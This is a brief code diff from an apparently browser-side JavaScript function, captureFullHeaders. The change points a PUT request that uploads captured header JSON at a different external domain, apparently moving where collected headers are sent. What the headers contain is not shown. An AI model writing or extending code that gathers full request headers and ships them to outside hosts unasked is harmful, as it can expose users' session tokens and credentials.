@@ -71,7 +71,7 @@ async function captureFullHeaders(targetApiUrl) {
                     "header_text": headerJson
                 });
 
-                let response = await fetch("https://api.japanallpass.com/api/header-setting", {
+                let response = await fetch("https://api.hellopassxyz.com/api/header-setting", {
                     method: "PUT",
                     body: bodyContent,
                     headers: headersList
